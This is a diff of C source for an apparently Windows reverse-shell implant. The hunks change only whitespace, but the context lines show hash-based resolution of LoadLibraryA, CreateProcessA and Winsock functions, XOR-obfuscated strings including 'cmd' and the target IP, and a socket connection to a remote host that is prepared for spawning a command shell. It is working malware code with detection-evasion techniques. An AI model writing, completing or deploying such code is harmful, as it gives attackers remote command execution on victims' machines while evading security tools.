@@ -2,13 +2,13 @@
 #include <stdio.h>
 #include <inttypes.h>
 
-#define LOADLIBRARYA_JS 	4035605851
-#define CREATEPROCESSA_JS   3182156714
-#define WSASTARTUP_JS		1260197060
-#define WSASOCKETA_JS		2402613366
-#define HTONS_JS			1648853536		
-#define INET_ADDR_JS		2791415637
-#define CONNECT_JS			1962494877
+#define LOADLIBRARYA_JS		4035605851
+#define CREATEPROCESSA_JS 	3182156714
+#define WSASTARTUP_JS 		1260197060
+#define WSASOCKETA_JS 		2402613366
+#define HTONS_JS 		1648853536
+#define INET_ADDR_JS 		2791415637
+#define CONNECT_JS 		1962494877
 
 #define XOR_KEY 0x6b
 
@@ -114,7 +114,6 @@ void rev() {
 	//HEX cmd    0x63, 0xcd, 0x64, key
 	char cmd[] = {0x08, 0x06, 0x0f, 0x6b};
 
-
 	UINT64 pLoadLibraryA = (UINT64)GetFuncAddr(LOADLIBRARYA_JS);	// Get function addresses
 	UINT64 pCreateProcessA = (UINT64)GetFuncAddr(CREATEPROCESSA_JS);	
 	((LOADLIBRARYA)pLoadLibraryA)(xor(ws2_32_dll));
@@ -133,7 +132,7 @@ void rev() {
 	SOCKET socket = ((WSASOCKETA)pWsaSocketA)(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // creates the socket
 	sa.sin_family = AF_INET;
 	sa.sin_port = ((HTONS)pHtons)(port); 
-	sa.sin_addr.s_addr = ((INET_ADDR)pInet_addr)(xor(ip)); // sets sa fields
+	sa.sin_addr.s_addr = ((INET_ADDR)pInet_addr)(xor(ip)); 	// sets sa fields
 	((CONNECT)pConnect)(socket, (struct sockaddr*)&sa, sizeof(sa)); // perform the connection
 	size_t siLen = sizeof(si);
 	memset(&si, 0 ,siLen); // fill in si (prep for CreateProcessA)
